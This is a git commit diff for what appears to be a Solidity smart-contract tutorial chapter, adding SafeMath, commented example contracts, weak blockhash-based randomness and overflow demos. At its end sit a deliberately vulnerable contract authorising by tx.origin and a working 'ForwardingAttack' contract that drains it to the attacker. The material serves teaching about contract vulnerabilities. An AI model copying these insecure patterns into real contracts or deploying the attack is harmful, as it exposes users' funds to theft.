37a4dbec91e8799dcb5bafe615549be1bb0746f9
Kedar Iyer <kedarmail@gmail.com>
2017-11-01 14:40:31 -0700

    ch.4 complete

---
+++ contracts/SafeMath.sol
@@ -0,0 +1,30 @@
+pragma solidity ^0.4.13;
+
+/**
+ * Math operations with safety checks
+ */
+contract SafeMath {
+    function safeMul(uint a, uint b) internal pure returns (uint) {
+        uint c = a * b;
+        assert(a == 0 || c / a == b);
+        return c;
+    }
+
+    function safeDiv(uint a, uint b) internal pure returns (uint) {
+        assert(b > 0);
+        uint c = a / b;
+        assert(a == b * c + a % b);
+        return c;
+    }
+
+    function safeSub(uint a, uint b) internal pure returns (uint) {
+        assert(b <= a);
+        return a - b;
+    }
+
+    function safeAdd(uint a, uint b) internal pure returns (uint) {
+        uint c = a + b;
+        assert(c>=a && c>=b);
+        return c;
+    }
+}
--- contracts/Test.sol
+++ contracts/Test.sol
@@ -184,8 +184,7 @@ pragma solidity ^0.4.15; // specifies minimum Solidity version to compiler
 //
 //    function randomNumber() returns (uint) {
 //        // we will implement this in a later section
-//        // for now imagine it returns a number from
-//        // 0-36
+//        // for now it returns 0 by default
 //    }
 //
 //    function withdraw () {
@@ -248,3 +247,132 @@ pragma solidity ^0.4.15; // specifies minimum Solidity version to compiler
 //        balances[husband] += msg.value / 2;
 //    }
 //}
+//
+//contract ERC20 {
+//  uint public totalSupply;
+//
+//  function balanceOf(address who) constant returns (uint);
+//  function allowance(address owner, address spender) constant returns (uint);
+//
+//  function transfer(address to, uint value) returns (bool ok);
+//  function transferFrom(address from, address to, uint value) returns (bool ok);
+//  function approve(address spender, uint value) returns (bool ok);
+//
+//  event Transfer(address indexed from, address indexed to, uint value);
+//  event Approval(address indexed owner, address indexed spender, uint value);
+//}
+//
+//contract TokenSale {
+//    enum State { Active, Suspended }
+//
+//    address public owner;
+//    ERC20 public token;
+//    State public state;
+//
+//    function TokenSale(address tokenContractAddress) {
+//        owner = msg.sender;
+//        token = ERC20(tokenContractAddress);
+//        state = State.Active;
+//    }
+//
+//    // 1:1 exchange of ETH for token
+//    function buy() payable {
+//        require(state == State.Active);
+//        token.transfer(msg.sender, msg.value);
+//    }
+//
+//    function suspend () {
+//        require(msg.sender == owner);
+//        state = State.Suspended;
+//    }
+//
+//    function activate () {
+//        require(msg.sender == owner);
+//        state = State.Active;
+//    }
+//
+//    function withdraw() {
+//        require(msg.sender == owner);
+//        owner.transfer(address(this).balance);
+//    }
+//}
+//contract Random {
+//    function example () public view returns (uint) {
+//        uint seed = 0x7543def;
+//        return range(seed, 100);
+//    }
+//
+//    function range (uint seed, uint max) public view returns (uint) {
+//        return random(seed) % max;
+//    }
+//
+//    function random(uint seed) public view returns (uint) {
+//        return uint(
+//            keccak256(block.blockhash(block.number-1), seed)
+//        );
+//    }
+//}
+//contract C {
+//    // (2**256 - 1) + 1 = 0
+//    function overflow() returns (uint256 _overflow) {
+//        uint256 max = 2**256 - 1;
+//        return max + 1;
+//    }
+//
+//    function mult () returns (int8) {
+//        int8 b = 64;
+//        b *= 3;
+//        return b;
+//    }
+//
+//    // 0 - 1 = 2**256 - 1
+//    function underflow() returns (uint256 _underflow) {
+//        uint256 min = 0;
+//        return min - 1;
+//    }
+//}
+//contract Stock {
+//    function balanceOf (address owner) public view returns (uint) {
+//        return 0; 
+//    }
+//    function transfer(address to, uint amount) public {}
+//}
+//contract MarriageInvestment {
+//    address wife = address(0); // dummy address
+//    address husband = address(1); // dummy address
+//    Stock GOOG = Stock(address(2)); // dummy contract
+//
+//    function split () public {
+//        uint amount = GOOG.balanceOf(address(this));
+//        uint each = amount / 2;
+//        uint remainder = amount % 2;
+//        GOOG.transfer(husband, each + remainder);
+//        GOOG.transfer(wife, each);
+//    }
+//}
+contract HackableTransfer {
+    address public owner;
+
+    function HackableTransfer() public {
+        owner = msg.sender;
+    }
+
+    function transferTo(address dest) public {
+        require(tx.origin == owner);
+        dest.transfer(address(this).balance);
+    }
+
+}
+contract ForwardingAttack {
+    HackableTransfer hackable;
+    address attacker;
+
+    function ForwardingAttack (address _hackable) public {
+        hackable = HackableTransfer(_hackable);
+        attacker = msg.sender;
+    }
+
+    function () payable public {
+        hackable.transferTo(attacker);
+    }
+}
